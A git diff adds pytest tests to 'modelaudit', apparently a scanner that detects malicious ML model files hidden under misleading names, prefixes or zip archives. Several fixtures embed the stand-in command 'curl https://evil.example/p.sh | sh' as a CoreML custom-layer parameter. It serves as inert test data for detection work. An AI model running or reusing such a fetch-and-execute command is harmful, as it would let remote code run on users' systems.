@@ -24,6 +24,7 @@ from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES
 from modelaudit.utils.file.detection import PROTOBUF_MODEL_CANDIDATE_FORMAT
 from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
 from tests.helpers import (
+    create_mock_coreml,
     create_mock_gguf,
     create_mock_onnx,
     create_mock_pytorch_zip,
@@ -1821,6 +1822,49 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
     )
 
 
+@pytest.mark.parametrize("prefix", [b"", b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
+def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path, prefix: bytes) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "malicious.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"\x9a\x06\x00" * 4097,
+        b"\x9b\x06" + (b"\x08\x01" * 4097) + b"\x9c\x06",
+    ],
+    ids=["top-level-field-budget", "unknown-group-budget"],
+)
+def test_scan_file_detects_malicious_budget_exhausted_renamed_coreml(tmp_path: Path, prefix: bytes) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "budgeted.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
 def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     disguised_onnx = create_mock_onnx(tmp_path / "malicious.jpg", op_type="PythonOp")
@@ -1832,6 +1876,31 @@ def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: 
     assert result.success is False
     assert any(
         issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06", b"\x9a\x06\x00" * 4097],
+    ids=["unknown-field", "unknown-group", "field-budget-candidate"],
+)
+def test_scan_file_routes_prefixed_misnamed_coreml_nested_in_zip(tmp_path: Path, prefix: bytes) -> None:
+    nested_coreml = create_mock_coreml(
+        tmp_path / "nested.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    nested_coreml.write_bytes(prefix + nested_coreml.read_bytes())
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.write(nested_coreml, arcname="models/nested.jpg")
+
+    result = scan_file(str(archive_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
         for issue in result.issues
     )
 
@@ -1853,6 +1922,21 @@ def test_scan_file_detects_malicious_budget_exhausted_prefixed_renamed_onnx(tmp_
     assert core_module.determine_exit_code(aggregate) == 1
 
 
+def test_scan_file_detects_malicious_group_budget_exhausted_renamed_onnx(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    disguised_onnx = create_mock_onnx(tmp_path / "group-budget.jpg", op_type="PythonOp")
+    disguised_onnx.write_bytes(b"\xa3\x06" + (b"\x08\x01" * 513) + b"\xa4\x06" + disguised_onnx.read_bytes())
+
+    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "onnx"
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
 def test_scan_file_detects_malicious_budget_exhausted_onnx_with_protobuf_suffix(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.pb", op_type="PythonOp")
@@ -1866,6 +1950,41 @@ def test_scan_file_detects_malicious_budget_exhausted_onnx_with_protobuf_suffix(
         issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
         for issue in result.issues
     )
+
+
+def test_scan_file_analyzes_coreml_candidate_when_onnx_dependency_is_unavailable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "candidate.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes((b"\x9a\x06\x00" * 4097) + disguised_coreml.read_bytes())
+    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+    result = scan_file(str(disguised_coreml), config={"cache_enabled": False})
+
+    assert result.scanner_name == "coreml"
+    assert result.success is False
+    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)
+
+
+def test_scan_file_unresolved_candidate_without_onnx_dependency_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    candidate = tmp_path / "candidate.jpg"
+    candidate.write_bytes(b"\x42\x00" * 4097)
+    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+    result = scan_file(str(candidate), config={"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "onnx_tentative_candidate_analysis_unavailable" in result.metadata["scan_outcome_reasons"]
 
 
 def test_scan_file_rejects_budget_exhausted_protobuf_without_onnx_structure_cleanly(tmp_path: Path) -> None:
@@ -1957,6 +2076,7 @@ def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp
 
 
 def test_scan_file_rejects_malformed_protobuf_near_match_without_finding(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
     malformed_payload = tmp_path / "malformed-large.jpg"
     malformed_payload.write_bytes(b"\x12" + (b"x" * _MAX_PARSE_BYTES))
     cache_dir = tmp_path / "cache"
@@ -1975,10 +2095,7 @@ def test_scan_file_rejects_malformed_protobuf_near_match_without_finding(tmp_pat
         assert result.success is True
         assert repeated_result.success is True
         assert result.issues == []
-        assert (
-            result.metadata.get("tentative_protobuf_candidate_rejected") is True
-            or result.metadata.get("tentative_protobuf_candidate_unanalyzed") == "onnx_dependency_unavailable"
-        )
+        assert result.metadata.get("tentative_protobuf_candidate_rejected") is True
         assert "scan_outcome" not in result.metadata
     finally:
         reset_cache_manager()
@@ -2125,7 +2242,7 @@ def test_scan_file_unavailable_protobuf_candidate_analyzer_fails_closed_and_is_n
         assert first.metadata["operational_error_reason"] == "protobuf_model_routing_incomplete"
         assert first.metadata["scan_outcome"] == "inconclusive"
         check = next(check for check in first.checks if check.name == "Protobuf Model Routing")
-        assert "tentative ONNX analysis was unavailable" in check.message
+        assert "tentative protobuf analysis was unavailable" in check.message
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
     finally:
         reset_cache_manager()
